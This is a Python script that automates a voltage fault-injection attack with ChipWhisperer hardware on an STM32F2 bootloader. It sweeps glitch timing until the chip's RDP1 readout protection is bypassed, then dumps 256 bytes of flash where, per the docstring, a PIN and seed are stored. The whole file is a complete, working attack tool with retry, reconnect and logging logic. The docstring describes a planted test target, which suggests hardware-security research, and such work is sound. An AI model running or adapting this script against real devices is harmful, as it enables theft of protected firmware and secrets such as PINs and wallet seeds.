#!/usr/bin/env python
"""Glitch-2 campaign: RDP1 readout bypass in the STM32F2 system bootloader.

Target state (all proven on this rig): RDP1 chip, planted storage with known
PIN/seed at 0x08008000, bootloader syncs (0x7F->79), Read Memory NACKs (1F).

Attack: send the Read Memory command pair (0x11 0xEE) as one UART burst; TIO3
(tee'd on the FTDI TX line) gives an edge-locked trigger; the crowbar pulse
into VCAP (pad 31, cap removed) fires ext_offset cycles later (100 MHz clkgen
= 10 ns/cycle). The RDP refusal happens after the 2-byte pair (~191 us burst;
~178 us past the first rising edge) + processing - sweep just past that.

SUCCESS = ACK (0x79) instead of NACK -> immediately complete the Read Memory
exchange (addr 0x08008000, N=256) and verify the canary 4e524332 / 02 00 3C 00.

Fast loop: after a plain NACK the bootloader session is alive - retry without
rebooting. After a crash (no response) - power-cycle and re-sync.
"""
import atexit
import csv
import os
import signal
import sys
import threading
import time
from datetime import datetime

import serial

import chipwhisperer as cw

from serialfind import find_ftdi

UART = find_ftdi()
ADDR = 0x08008000
ADDR_CKS = 0x08 ^ 0x00 ^ 0x80 ^ 0x00          # 0x88
NBYTES = 256

WIDTHS  = [int(x) for x in os.environ.get('G_WIDTH', '40').split(',')]
OFFSET  = int(os.environ.get('G_OFFSET', -45))
CLKGEN  = float(os.environ.get('G_CLKGEN', 4e6))   # 4MHz: 49.8% = 124ns pulses
REPEATS = [int(x) for x in os.environ.get('G_REPEATS', '10,25,40,49').split(',')]
# LA-measured 2026-10-23: 0xEE stop bit ends +182.0us past the TIO3 trigger
# edge, NACK starts +183.0us -> RDP decision window ~178-183us. Sweep tight.
# NOTE ext_offset units = clkgen cycles: at 4MHz one step = 250ns.
EXT_MIN = int(os.environ.get('G_EXT_MIN', 700))
EXT_MAX = int(os.environ.get('G_EXT_MAX', 750))
STEP    = int(os.environ.get('G_STEP', 1))
SAMPLES = int(os.environ.get('G_SAMPLES', 1))   # shots per grid point
SHOTS_MAX = int(os.environ.get('G_SHOTS', 2000))
COOLDOWN = float(os.environ.get('G_COOLDOWN', 0.15))
REST_EVERY = int(os.environ.get('G_REST_EVERY', 300))
REST_S  = float(os.environ.get('G_REST_S', 20))

CANARY_MAGIC = bytes.fromhex('4e524332')      # 'NRC2' LE at 0x08008000

scope = None
ser = None
_torn = False


def teardown(*_):
    global _torn
    if _torn:
        return
    _torn = True
    for attr, val in (('glitch_hp', False), ('glitch_lp', False),
                      ('target_pwr', False), ('nrst', 'high_z')):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass


atexit.register(teardown)
signal.signal(signal.SIGINT, teardown)
signal.signal(signal.SIGTERM, teardown)


def boot_and_sync(fast=True):
    """Recover the bootloader session. NRST pulse = ~350ms; power cycle =
    ~4.5s fallback (also used for the initial boot)."""
    if fast:
        scope.io.tio4 = 'gpio_low'
        time.sleep(0.02)
        scope.io.tio4 = 'high_z'
    else:
        scope.io.tio1 = True
        scope.io.tio2 = 'high_z'
        scope.io.target_pwr = False
        time.sleep(1.5)
        scope.io.target_pwr = True
        time.sleep(3)
        # re-latch crowbar drivers after power events (per proven script)
        scope.io.glitch_hp = False; scope.io.glitch_hp = True
        scope.io.glitch_lp = False; scope.io.glitch_lp = True
    for _ in range(8):
        _kick()
        ser.reset_input_buffer()
        ser.write(b'\x7f')
        if b'\x79' in ser.read(8):
            return True
        time.sleep(0.05)
    return False


def complete_read():
    """Command got ACKed - finish the Read Memory exchange. Returns bytes."""
    ab = ADDR.to_bytes(4, 'big')
    ser.write(ab + bytes([ADDR_CKS]))
    r = ser.read(8)
    if not r or r[0] != 0x79:
        return None, f'addr stage refused: {r.hex() if r else "(nothing)"}'
    n1 = NBYTES - 1
    ser.write(bytes([n1, n1 ^ 0xFF]))
    r = ser.read(NBYTES + 16)
    if not r or r[0] != 0x79:
        return None, f'len stage refused: {r.hex()[:16] if r else "(nothing)"}'
    return r[1:1 + NBYTES], None


LAST_W = LAST_O = None


# ---- watchdog: USB-serial disconnects can wedge pyserial's poll forever;
# if no progress for 60 s, hard-exit so the hammer loop relaunches cleanly.
_progress = [time.time()]


def _watchdog():
    while True:
        time.sleep(10)
        if time.time() - _progress[0] > 60:
            print('  [watchdog] no progress for 60s - hard exit for relaunch',
                  flush=True)
            os._exit(3)


def _kick():
    _progress[0] = time.time()


def attempt(ext_offset, width, repeat):
    """One shot. Returns (verdict, payload, note)."""
    global LAST_W, LAST_O
    g = scope.glitch
    # width/offset writes trigger FPGA partial-reconfig + DCM reset - a known
    # hang risk (NewAE forum) and slow. Only write when the value changes.
    if width != LAST_W:
        g.width = width
        LAST_W = width
    if OFFSET != LAST_O:
        g.offset = OFFSET
        LAST_O = OFFSET
    g.ext_offset = ext_offset
    g.repeat = repeat
    scope.arm()
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')            # the burst TIO3 triggers on
    r = ser.read(32)                  # NACK / ACK / silence
    if r and 0x79 in r:
        data, note = complete_read()
        if data:
            return 'SUCCESS', data, note or ''
        return 'ACK_NO_DATA', None, note
    if r and 0x1F in r:
        return 'nack', None, r.hex()
    if not r:
        return 'dead', None, ''
    return 'weird', None, r.hex()


def reconnect(tries=5):
    """Rebuild the CW + serial session after a USB dropout (the CW drops
    every ~12 min on this rig). Re-applies the full glitch/trigger config,
    then boots + syncs the target. Returns True when the rig is back."""
    global scope, ser, LAST_W, LAST_O
    for attr, val in (('glitch_hp', False), ('glitch_lp', False)):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass
    try:
        ser.close()
    except Exception:
        pass
    for attempt in range(tries):
        time.sleep(2.0)
        try:
            scope = cw.scope()
            try:
                import zipfile as _zf
                _fw = scope.scopetype.getFWConfig()
                _z = _zf.ZipFile(_fw.loader._bsBuiltinData)
                with open('/tmp/opencode/cwlite_interface.bit', 'wb') as _bf:
                    _bf.write(_z.read('cwlite_interface.bit'))
                scope.scopetype.reload_fpga('/tmp/opencode/cwlite_interface.bit')
            except Exception:
                pass
            scope.clock.clkgen_freq = CLKGEN
            g = scope.glitch
            g.clk_src = 'clkgen'
            g.output = 'enable_only'
            g.trigger_src = 'ext_single'
            scope.trigger.triggers = 'tio3'
            scope.adc.basic_mode = 'rising_edge'
            scope.io.glitch_lp = True
            scope.io.glitch_hp = True
            scope.io.tio3 = 'high_z'
            scope.io.tio1 = True
            scope.io.tio2 = 'high_z'
            scope.io.tio4 = 'high_z'
            LAST_W = LAST_O = None          # force width/offset re-apply
            ser = serial.Serial(find_ftdi(), 115200, bytesize=8,
                                parity='E', stopbits=1, timeout=0.4)
            if boot_and_sync(fast=False):
                print(f'  [reconnect OK on try {attempt + 1}]', flush=True)
                return True
        except Exception as e:
            print(f'  [reconnect try {attempt + 1} failed: '
                  f'{type(e).__name__}]', flush=True)
    return False


def main():
    global scope, ser
    scope = cw.scope()
    scope.io.target_pwr = 'high_z'
    # Every fresh CW power-up makes the SAM3U load its OLD stored bitstream,
    # which mismatches the 6.0.0 partial-reconfig data (width knob dies).
    # Reprogram the FPGA from the package's matched bitstream+PR pair.
    try:
        import zipfile as _zf
        _fw = scope.scopetype.getFWConfig()
        _z = _zf.ZipFile(_fw.loader._bsBuiltinData)
        with open('/tmp/opencode/cwlite_interface.bit', 'wb') as _bf:
            _bf.write(_z.read('cwlite_interface.bit'))
        scope.scopetype.reload_fpga('/tmp/opencode/cwlite_interface.bit')
        print('[+] FPGA reloaded from 6.0.0 matched pair')
    except Exception as e:
        print(f'[!] FPGA reload skipped: {type(e).__name__} {e}')
    scope.clock.clkgen_freq = CLKGEN
    g = scope.glitch
    g.clk_src = 'clkgen'
    g.output = 'enable_only'
    g.trigger_src = 'ext_single'
    scope.trigger.triggers = 'tio3'
    scope.adc.basic_mode = 'rising_edge'
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    scope.io.tio3 = 'high_z'

    ser = serial.Serial(UART, 115200, bytesize=8, parity='E',
                        stopbits=1, timeout=0.4)

    if not boot_and_sync(fast=False):
        teardown(); sys.exit('no sync to start')
    print(f'[+] synced. sweep ext {EXT_MIN}-{EXT_MAX} step {STEP} '
          f'widths {WIDTHS} offset {OFFSET} repeats {REPEATS}')
    threading.Thread(target=_watchdog, daemon=True).start()

    log_path = f'glitch2_{datetime.now():%Y%m%d_%H%M%S}.csv'
    logf = open(log_path, 'w', newline='')
    logw = csv.writer(logf)
    logw.writerow(['shot', 'ext_offset', 'us', 'width', 'repeat', 'verdict', 'note'])

    shot = 0
    t0 = time.time()
    for ext in range(EXT_MIN, EXT_MAX + 1, STEP):
        for width in WIDTHS:
            for repeat in REPEATS:
                for _sample in range(SAMPLES):
                    # rig-drop recovery: any USB/CW/serial exception during a
                    # shot -> rebuild the session, RESUME at the same point.
                    try:
                        _kick()
                        verdict, payload, note = attempt(ext, width, repeat)
                    except Exception as e:
                        print(f'  [rig-drop] {type(e).__name__} at '
                              f'ext={ext * 1e6 / CLKGEN:.1f}us rep={repeat} '
                              f'-> reconnect', flush=True)
                        if not reconnect():
                            teardown(); sys.exit(f'rig lost after rig-drop: {e}')
                        continue          # same grid point, next stochastic roll
                    shot += 1
                    logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 2),
                                   width, repeat, verdict, note])
                if verdict == 'SUCCESS':
                    out = f'JACKPOT_{datetime.now():%H%M%S}.bin'
                    open(out, 'wb').write(payload)
                    print(f'\n[***] GLITCH-2 SUCCESS  ext={ext} '
                          f'({ext * 1e6 / CLKGEN:.1f}us) width={width} '
                          f'repeat={repeat}')
                    print(f'      dumped {len(payload)} B -> {out}')
                    print(f'      first16: {payload[:16].hex()}')
                    if payload[:4] == CANARY_MAGIC:
                        print('      CANARY MATCH - this is the real storage!')
                    logf.flush()
                    teardown()
                    return
                if verdict in ('dead', 'ACK_NO_DATA', 'weird'):
                    print(f'  [{verdict}] ext={ext * 1e6 / CLKGEN:6.1f}us '
                          f'rep={repeat} {note} -> resync', flush=True)
                    try:
                        ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
                    except Exception:
                        ok = False
                    if not ok:
                        if not reconnect():
                            teardown(); sys.exit('target/rig lost after resync')
                time.sleep(COOLDOWN)
                if shot % REST_EVERY == 0:
                    print(f'  …rest {REST_S}s ({shot} shots)')
                    time.sleep(REST_S)
                # heartbeat: rate + last verdict, so stalls show in the log
                if shot % 200 == 0:
                    rate = shot / (time.time() - t0)
                    print(f'  | {shot} shots, {rate:.1f}/s, '
                          f'ext={ext * 1e6 / CLKGEN:.1f}us rep={repeat} '
                          f'last={verdict}', flush=True)
                    logf.flush()
                if shot >= SHOTS_MAX:
                    print(f'  shot limit {SHOTS_MAX} reached')
                    logf.flush()
                    teardown()
                    return
    logf.flush()
    print(f'[.] sweep done, {shot} shots, log -> {log_path}')
    teardown()


if __name__ == '__main__':
    main()
